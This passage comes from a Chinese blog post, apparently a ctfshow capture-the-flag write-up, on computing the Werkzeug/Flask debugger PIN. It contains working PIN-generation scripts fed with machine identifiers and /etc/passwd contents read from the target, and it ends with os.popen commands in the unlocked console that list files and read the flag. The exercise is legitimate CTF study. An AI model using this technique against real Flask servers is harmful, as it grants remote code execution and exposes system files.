          rv <span class="token operator">=</span> <span class="token string">'-'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>num<span class="token punctuation">[</span>x<span class="token punctuation">:</span>x <span class="token operator">+</span> group_size<span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>group_size<span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span>
                      <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">,</span> group_size<span class="token punctuation">)</span><span class="token punctuation">)</span>
          <span class="token keyword">break</span>
       <span class="token keyword">else</span><span class="token punctuation">:</span>
          rv <span class="token operator">=</span> num
<span class="token keyword">print</span><span class="token punctuation">(</span>rv<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>3.8</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#sha1</span>
<span class="token keyword">import</span> hashlib
<span class="token keyword">from</span> itertools <span class="token keyword">import</span> chain
probably_public_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">'root'</span>
    <span class="token string">'flask.app'</span><span class="token punctuation">,</span>
    <span class="token string">'Flask'</span><span class="token punctuation">,</span>
    <span class="token string">'/usr/local/lib/python3.8/site-packages/flask/app.py'</span>
<span class="token punctuation">]</span>
private_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">'2485377581187'</span><span class="token punctuation">,</span>
    <span class="token string">'653dc458-4634-42b1-9a7a-b22a082e1fce55d22089f5fa429839d25dcea4675fb930c111da3bb774a6ab7349428589aefd'</span>
<span class="token punctuation">]</span>
h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> bit <span class="token keyword">in</span> chain<span class="token punctuation">(</span>probably_public_bits<span class="token punctuation">,</span> private_bits<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> bit<span class="token punctuation">:</span>
        <span class="token keyword">continue</span>
    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>bit<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        bit <span class="token operator">=</span> bit<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>bit<span class="token punctuation">)</span>
h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'cookiesalt'</span><span class="token punctuation">)</span>
cookie_name <span class="token operator">=</span> <span class="token string">'__wzd'</span> <span class="token operator">+</span> h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">]</span>
num <span class="token operator">=</span> <span class="token boolean">None</span>
<span class="token keyword">if</span> num <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'pinsalt'</span><span class="token punctuation">)</span>
    num <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'%09d'</span> <span class="token operator">%</span> <span class="token builtin">int</span><span class="token punctuation">(</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>
rv <span class="token operator">=</span><span class="token boolean">None</span>
<span class="token keyword">if</span> rv <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> group_size <span class="token keyword">in</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">%</span> group_size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
            rv <span class="token operator">=</span> <span class="token string">'-'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>num<span class="token punctuation">[</span>x<span class="token punctuation">:</span>x <span class="token operator">+</span> group_size<span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>group_size<span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span>
                          <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">,</span> group_size<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        rv <span class="token operator">=</span> num
<span class="token keyword">print</span><span class="token punctuation">(</span>rv<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><img src="/images/image-20220912235526327.png" alt="image-20220912235526327"></p>
<p><img src="/images/image-20220912235550521.png" alt="image-20220912235550521">果然有报错信息</p>
<h3 id="1-flask所登录的用户名（-x2F-etc-x2F-passwd）"><a href="#1-flask所登录的用户名（-x2F-etc-x2F-passwd）" class="headerlink" title="1.flask所登录的用户名（&#x2F;etc&#x2F;passwd）"></a>1.flask所登录的用户名（&#x2F;etc&#x2F;passwd）</h3><pre class="line-numbers language-text" data-language="text"><code class="language-text">root:x:0:0:root:/root:/bin/ash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/mail:/sbin/nologin news:x:9:13:news:/usr/lib/news:/sbin/nologin uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin operator:x:11:0:operator:/root:/sbin/nologin man:x:13:15:man:/usr/man:/sbin/nologin postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin cron:x:16:16:cron:/var/spool/cron:/sbin/nologin ftp:x:21:21::/var/lib/ftp:/sbin/nologin sshd:x:22:22:sshd:/dev/null:/sbin/nologin at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin games:x:35:35:games:/usr/games:/sbin/nologin cyrus:x:85:12::/usr/cyrus:/sbin/nologin vpopmail:x:89:89::/var/vpopmail:/sbin/nologin ntp:x:123:123:NTP:/var/empty:/sbin/nologin smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin guest:x:405:100:guest:/dev/null:/sbin/nologin nobody:x:65534:65534:nobody:/:/sbin/nologin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>如果没有和比赛有关的名字(自定义用户名)，一般就是root</strong></p>
<h3 id="2-modname"><a href="#2-modname" class="headerlink" title="2.modname"></a>2.modname</h3><p>flask.app</p>
<h3 id="3-appname"><a href="#3-appname" class="headerlink" title="3.appname"></a>3.appname</h3><p>Flask</p>
<h3 id="4-moddir"><a href="#4-moddir" class="headerlink" title="4.moddir"></a>4.moddir</h3><p><img src="/images/image-20220913000552141.png" alt="image-20220913000552141"></p>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">/usr/local/lib/python3.8/site-packages/flask/app.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="5-mac地址的十进制数-x2F-sys-x2F-class-x2F-net-x2F-eth0-x2F-address"><a href="#5-mac地址的十进制数-x2F-sys-x2F-class-x2F-net-x2F-eth0-x2F-address" class="headerlink" title="5.mac地址的十进制数(&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address)"></a>5.mac地址的十进制数(&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address)</h3><p><img src="/images/image-20220913000724133.png" alt="image-20220913000724133"></p>
<p> 02:42:ac:0c:a9:36 &#x3D;&gt;10进制&#x3D;&gt; 2485377607990</p>
<h3 id="6-docker机器id"><a href="#6-docker机器id" class="headerlink" title="6.docker机器id"></a>6.docker机器id</h3><p> <strong>旧版(3.6)的只需要读取&#x2F;proc&#x2F;self&#x2F;cgroup即可，但是新增(3.8)需要在前面再拼上&#x2F;etc&#x2F;machine-id或者&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id的值</strong> </p>
<p>&#x2F;etc&#x2F;machine-id</p>
<p>无</p>
<p>&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id </p>
<p><img src="/images/image-20220913003446721.png" alt="image-20220913003446721"></p>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">8f95c377-0690-4c28-aa82-8303645d4459<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>&#x2F;proc&#x2F;self&#x2F;cgroup</p>
<p><img src="/images/image-20220913003513693.png" alt="image-20220913003513693"></p>
<p>machine_id 每一个机器都会有自已唯一的id，linux的id一般存放在&#x2F;etc&#x2F;machine-id或&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id，docker靶机则读取&#x2F;proc&#x2F;self&#x2F;cgroup，其中<strong>第一行的&#x2F;docker&#x2F;字符串后面的内容作为机器的id</strong>，在docker环境下读取后两个，非docker环境三个都需要读取</p>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">39ee382b02a28a5b64c1b862ce8d30f08b4d2b97f36712d55dc6418403c185c3  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>docker机3.8版本需要 (&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id) +&#x2F;proc&#x2F;self&#x2F;cgroup</p>
<p>最终机器id</p>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">8f95c377-0690-4c28-aa82-8303645d445939ee382b02a28a5b64c1b862ce8d30f08b4d2b97f36712d55dc6418403c185c3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>脚本</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#sha1</span>
<span class="token keyword">import</span> hashlib
<span class="token keyword">from</span> itertools <span class="token keyword">import</span> chain
probably_public_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">'root'</span>
    <span class="token string">'flask.app'</span><span class="token punctuation">,</span>
    <span class="token string">'Flask'</span><span class="token punctuation">,</span>
    <span class="token string">'/usr/local/lib/python3.8/site-packages/flask/app.py'</span>
<span class="token punctuation">]</span>
private_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">'2485377607990'</span><span class="token punctuation">,</span>
    <span class="token string">'8f95c377-0690-4c28-aa82-8303645d445939ee382b02a28a5b64c1b862ce8d30f08b4d2b97f36712d55dc6418403c185c3'</span>
<span class="token punctuation">]</span>
h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> bit <span class="token keyword">in</span> chain<span class="token punctuation">(</span>probably_public_bits<span class="token punctuation">,</span> private_bits<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> bit<span class="token punctuation">:</span>
        <span class="token keyword">continue</span>
    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>bit<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        bit <span class="token operator">=</span> bit<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>bit<span class="token punctuation">)</span>
h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'cookiesalt'</span><span class="token punctuation">)</span>
cookie_name <span class="token operator">=</span> <span class="token string">'__wzd'</span> <span class="token operator">+</span> h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">]</span>
num <span class="token operator">=</span> <span class="token boolean">None</span>
<span class="token keyword">if</span> num <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'pinsalt'</span><span class="token punctuation">)</span>
    num <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'%09d'</span> <span class="token operator">%</span> <span class="token builtin">int</span><span class="token punctuation">(</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>
rv <span class="token operator">=</span><span class="token boolean">None</span>
<span class="token keyword">if</span> rv <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> group_size <span class="token keyword">in</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">%</span> group_size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
            rv <span class="token operator">=</span> <span class="token string">'-'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>num<span class="token punctuation">[</span>x<span class="token punctuation">:</span>x <span class="token operator">+</span> group_size<span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>group_size<span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span>
                          <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">,</span> group_size<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        rv <span class="token operator">=</span> num
<span class="token keyword">print</span><span class="token punctuation">(</span>rv<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>算出pin后</p>
<p> 点击调试窗口 按照python命令执行操作</p>
<p><img src="/images/202204150034580221_14.png" alt="在这里插入图片描述"></p>
<p>一般禁用了system</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">>></span><span class="token operator">></span> <span class="token function">import</span> os
<span class="token operator">>></span><span class="token operator">></span> os.popen<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span>
<span class="token operator">&lt;</span>os._wrap_close object at 0x7f798eaa79a<span class="token operator"><span class="token file-descriptor important">0</span>></span>
<span class="token operator">>></span><span class="token operator">></span> os.popen<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span>.read<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token string">'app.py\n'</span>
<span class="token operator">>></span><span class="token operator">></span> os.popen<span class="token punctuation">(</span><span class="token string">'ls /'</span><span class="token punctuation">)</span>.read<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token string">'app\nbin\ndev\netc\nflag\nhome\nlib\nmedia\nmnt\nopt\nproc\nroot\nrun  
>>> os.popen('</span><span class="token function">tac</span> /fl*<span class="token string">').read()
'</span>ctfshow<span class="token punctuation">&#123;</span>fc9e96b7-d1a8-43d8-aeca-e71ed40e482d<span class="token punctuation">&#125;</span><span class="token punctuation">\</span>n'
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">Aurorabin</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="http://zeobi.github.io/2022/09/13/flask-suan-pin-zhi/">http://zeobi.github.io/2022/09/13/flask-suan-pin-zhi/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="/about" target="_blank">Aurorabin</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/ctfshow/">
                                    <span class="chip bg-color">ctfshow</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
                <div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fas fa-times"></i></a>
            <h4 class="reward-title">网络乞讨</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                    </ul>
                    <div id="alipay">
                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
                    </div>
                    <div id="wechat">
                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>

            
        </div>
    </div>

    

    

    

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2022/09/13/wu-zi-mu-shu-zi-de-webshell/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="无字母数字的webshell">
                        
                        <span class="card-title">无字母数字的webshell</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2022-09-13
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-user fa-fw"></i>
                            Aurorabin
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/ctfshow/">
                        <span class="chip bg-color">ctfshow</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2022/09/12/xxe/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="XXE">
                        
                        <span class="card-title">XXE</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2022-09-12
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-user fa-fw"></i>
                            Aurorabin
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/ctfshow/">
                        <span class="chip bg-color">ctfshow</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>



<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>


  <!-- 是否加载使用自带的 prismjs. -->
  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>


<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>



    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h2, h3, h4'
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    
        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
<style>
    .aplayer .aplayer-lrc p {
        
        display: none;
        
        font-size: 12px;
        font-weight: 700;
        line-height: 16px !important;
    }

    .aplayer .aplayer-lrc p.aplayer-lrc-current {
        
        display: none;
        
        font-size: 15px;
        color: #42b983;
    }

    
    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
        left: -66px !important;
    }

    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
        left: 0px !important;
    }

    
</style>
<div class="">
    
    <div class="row">
        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
                   server="netease"
                   type="playlist"
                   id="503838841"
                   fixed='true'
                   autoplay='false'
                   theme='#42b983'
                   loop='all'
                   order='random'
                   preload='auto'
                   volume='0.7'
                   list-folded='true'
        >
        </meting-js>
    </div>
</div>

<script src="/libs/aplayer/APlayer.min.js"></script>
<script src="/libs/aplayer/Meting.min.js"></script>

    

    <div class="container row center-align"
         style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2019-2022</span>
            
            <a href="/about" target="_blank">Aurorabin</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            <br>
            
            
            
                
            
            
                <span id="busuanzi_container_site_pv">
                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
                    <span id="busuanzi_value_site_pv" class="white-color"></span>
            </span>
            
            
                <span id="busuanzi_container_site_uv">
                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
                    <span id="busuanzi_value_site_uv" class="white-color"></span>
            </span>
            
            <br>

            <!-- 运行天数提醒. -->
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/zeobi" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:877199409@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>







    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=877199409" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 877199409" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
